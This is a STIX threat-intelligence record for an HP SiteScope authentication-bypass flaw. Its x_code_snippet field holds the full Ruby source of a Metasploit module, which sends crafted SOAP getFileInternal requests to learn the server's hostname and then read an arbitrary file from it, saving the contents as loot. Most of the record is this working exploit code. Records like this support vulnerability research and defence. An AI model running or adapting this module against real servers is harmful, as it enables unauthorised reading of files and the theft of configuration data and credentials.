{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2714ea1-9542-4ca3-b1ba-eb8392fa2114",
    "created": "2024-08-14T16:30:03.713367Z",
    "modified": "2024-08-14T16:30:03.713373Z",
    "name": "HP SiteScope SOAP Call getFileInternal Remote File Access",
    "description": " This module exploits an authentication bypass vulnerability in HP SiteScope to retrieve an arbitrary file from the remote server. It is accomplished by calling the getFileInternal operation available through the APISiteScopeImpl AXIS service. This module has been successfully tested on HP SiteScope 11.20 over Windows 2003 SP2 and Linux Centos 6.3.  'References'   => [ [ 'OSVDB', '85119' ] [ 'BID', '55269' ] [ 'ZDI', '12-176' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess.rb",
            "external_id": "hp_sitescope_getfileinternal_fileaccess.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'HP SiteScope SOAP Call getFileInternal Remote File Access',\n      'Description'  =>  %q{\n          This module exploits an authentication bypass vulnerability in HP SiteScope to\n        retrieve an arbitrary file from the remote server. It is accomplished by calling\n        the getFileInternal operation available through the APISiteScopeImpl AXIS service.\n        This module has been successfully tested on HP SiteScope 11.20 over Windows 2003\n        SP2 and Linux Centos 6.3.\n      },\n      'References'   =>\n        [\n          [ 'OSVDB', '85119' ],\n          [ 'BID', '55269' ],\n          [ 'ZDI', '12-176' ]\n        ],\n      'Author'       =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(8080),\n      OptString.new('RFILE', [true, 'Remote File', 'c:\\\\windows\\\\win.ini']),\n      OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n    ])\n\n    register_autofilter_ports([ 8080 ])\n  end\n\n  def run_host(ip)\n    @uri = normalize_uri(target_uri.path)\n    @uri << '/' if @uri[-1,1] != '/'\n\n    print_status(\"Connecting to SiteScope SOAP Interface\")\n\n    res = send_request_cgi({\n      'uri'     => \"#{@uri}services/APISiteScopeImpl\",\n      'method'  => 'GET'})\n\n    if not res\n      print_error(\"Unable to connect\")\n      return\n    end\n\n    accessfile\n  end\n\n  def accessfile\n    print_status(\"Retrieving the target hostname\")\n\n    data = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n    data << \"<wsns0:Envelope\" + \"\\r\\n\"\n    data << \"xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"xmlns:xsd='http://www.w3.org/2001/XMLSchema'\" + \"\\r\\n\"\n    data << \"xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<wsns0:Body\" + \"\\r\\n\"\n    data << \"wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<impl:getFileInternal\" + \"\\r\\n\"\n    data << \"xmlns:impl='http://Api.freshtech.COM'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<in0\" + \"\\r\\n\"\n    data << \"xsi:nil='true'\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"></in0>\" + \"\\r\\n\"\n    data << \"<in1\" + \"\\r\\n\"\n    data << \"xsi:nil='true'\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"></in1>\" + \"\\r\\n\"\n    data << \"</impl:getFileInternal>\" + \"\\r\\n\"\n    data << \"</wsns0:Body>\" + \"\\r\\n\"\n    data << \"</wsns0:Envelope>\"\n\n    res = send_request_cgi({\n      'uri'      => \"#{@uri}services/APISiteScopeImpl\",\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => data,\n      'headers'  => {\n        'SOAPAction'    => '\"\"',\n    }}, 60)\n\n    if res and res.code == 500 and res.body =~ /<ns3:hostname xmlns:ns3=\"http:\\/\\/xml.apache.org\\/axis\\/\">(.*)<\\/ns3:hostname>/m\n      host_name = $1\n    end\n\n    if not host_name or host_name.empty?\n      print_error(\"Failed to retrieve the host name\")\n      return\n    end\n\n    print_status(\"Retrieving the file contents\")\n\n    data = \"<?xml version='1.0' encoding='UTF-8'?>\" + \"\\r\\n\"\n    data << \"<wsns0:Envelope\" + \"\\r\\n\"\n    data << \"xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \"xmlns:xsd='http://www.w3.org/2001/XMLSchema'\" + \"\\r\\n\"\n    data << \"xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<wsns0:Body\" + \"\\r\\n\"\n    data << \"wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<impl:getFileInternal\" + \"\\r\\n\"\n    data << \"xmlns:impl='http://Api.freshtech.COM'\" + \"\\r\\n\"\n    data << \">\" + \"\\r\\n\"\n    data << \"<in0\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \">#{host_name}</in0>\" + \"\\r\\n\"\n    data << \"<in1\" + \"\\r\\n\"\n    data << \"xsi:type='xsd:string'\" + \"\\r\\n\"\n    data << \"xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'\" + \"\\r\\n\"\n    data << \">#{datastore['RFILE']}</in1>\" + \"\\r\\n\"\n    data << \"</impl:getFileInternal>\" + \"\\r\\n\"\n    data << \"</wsns0:Body>\" + \"\\r\\n\"\n    data << \"</wsns0:Envelope>\"\n\n    res = send_request_cgi({\n      'uri'      => \"#{@uri}services/APISiteScopeImpl\",\n      'method'   => 'POST',\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'data'     => data,\n      'headers'  => {\n        'SOAPAction'    => '\"\"',\n    }})\n\n    if res and res.code == 200\n\n      if res.headers['Content-Type'] =~ /boundary=\"(.*)\"/\n        boundary = $1\n      end\n      if not boundary or boundary.empty?\n        print_error(\"Failed to retrieve the file contents\")\n        return\n      end\n\n      if res.body =~ /getFileInternalReturn href=\"cid:([A-F0-9]*)\"/\n        cid = $1\n      end\n      if not cid or cid.empty?\n        print_error(\"Failed to retrieve the file contents\")\n        return\n      end\n\n      if res.body =~ /#{cid}>\\r\\n\\r\\n(.*)\\r\\n--#{boundary}/m\n        loot = Rex::Text.ungzip($1)\n      end\n      if not loot or loot.empty?\n        print_error(\"Failed to retrieve the file contents\")\n        return\n      end\n\n      f = ::File.basename(datastore['RFILE'])\n      path = store_loot('hp.sitescope.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n      print_good(\"#{datastore['RFILE']} saved in #{path}\")\n      return\n    end\n\n    print_error(\"Failed to retrieve the file contents\")\n  end\nend\n\n"
}